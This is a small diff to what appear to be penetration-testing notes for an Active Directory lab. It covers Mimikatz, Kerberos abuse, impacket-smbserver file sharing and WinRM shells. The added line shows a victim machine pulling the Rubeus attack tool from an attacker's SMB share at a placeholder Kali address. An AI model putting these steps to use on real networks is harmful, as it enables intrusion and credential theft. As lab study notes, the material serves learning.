@@ -239,6 +239,7 @@ For Mimikatz, make the following changes:
     - `echo 10.10.187.139 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts`
 - Kerberos Abuse: https://blog.spookysec.net/kerberos-abuse/
 - To transfer files use smbserver: `sudo impacket-smbserver -smb2support share /home/kali/Downloads/`
+  - An example: from PowerShell of the victim, download Rubeus.exe with the command `Copy-Item -Path "\\<kali_IP>\share\Rubeus.exe" -Destination "C:\Users\username\Desktop"`
 - Certificate signing request for WinRM: https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html
   - WinRM shell: https://raw.githubusercontent.com/Alamot/code-snippets/master/winrm/winrm_shell.rb
 - NTLM Auth: https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html#beyond-root---ntlm-auth
